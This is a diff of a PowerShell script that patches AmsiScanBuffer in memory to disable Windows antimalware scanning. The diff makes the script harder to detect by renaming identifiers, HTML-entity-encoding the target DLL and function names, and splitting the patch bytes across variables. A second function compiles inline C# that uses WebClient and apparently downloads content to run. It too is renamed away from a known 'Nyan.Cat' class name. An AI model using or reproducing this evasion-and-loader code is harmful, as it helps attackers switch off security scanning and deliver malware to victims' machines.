@@ -4,10 +4,10 @@ function retac
 }
 function mosder
 {
-$Win32 = @"
+$ZQCUW = @"
 using System;
 using System.Runtime.InteropServices;
-public class Win32 {
+public class ZQCUW {
     [DllImport("kernel32")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
     [DllImport("kernel32")]
@@ -17,25 +17,31 @@ public class Win32 {
 }
 "@
 
-Add-Type $Win32
+Add-Type $ZQCUW
 
-$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
-$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
+$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
 $p = 0
-[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
-$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
+$TLML = "0xB8"
+$PURX = "0x57"
+$YNWL = "0x00"
+$RTGX = "0x07"
+$XVON = "0x80"
+$WRUD = "0xC3"
+$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
+[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
 }
 function grtzol
 {
-$code = @"
+$xsvcode = @"
 using System.Net;
 using System.Reflection;
 using System;
 using System.Threading;
-namespace Nyan
+namespace Xeroch
 {
-    public class Cat
+    public class Catyl
     {
         public static string BoUaI12WaY(string s)
         {
@@ -48,7 +54,7 @@ namespace Nyan
             return new string(array);
         }
     
-        public void Run()
+        public void aRuna()
         {
             using (WebClient wc = new WebClient())
             {
@@ -75,9 +81,9 @@ namespace Nyan
 }
 "@
 
-Add-Type -TypeDefinition $code;
-$instance = New-Object Nyan.Cat;
-$instance.Run();
+Add-Type -TypeDefinition $xsvcode;
+$cinstance = New-Object Xeroch.Catyl;
+$cinstance.aRuna();
 
 }
 retac
